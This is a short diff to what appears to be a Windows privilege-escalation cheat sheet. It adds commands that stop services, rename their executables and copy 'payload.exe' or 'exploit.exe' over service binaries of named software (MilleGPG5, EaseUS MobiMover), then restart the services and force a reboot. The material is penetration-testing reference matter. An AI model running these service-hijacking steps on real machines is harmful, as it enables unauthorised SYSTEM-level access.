@@ -1306,8 +1306,13 @@ sc stop &lt;SERVICE&gt; && sc start &lt;SERVICE&gt;
 
 # Stop service, replace, start
 sc.exe stop GPGOrchestrator
+ren <original>.exe <original>.bak
 copy payload.exe "C:\\Program Files\\MilleGPG5\\GPGService.exe"
+copy exploit.exe "C:\\Program Files (x86)\\EaseUS\\EaseUS MobiMover\\bin\\prepare.exe"
 sc.exe start GPGOrchestrato
+sc stop <service> && sc start <service>
+shutdown /r /t 0
+  
 
 # Check service permissions
 accesschk.exe /accepteula -uwcqv "Everyone" *
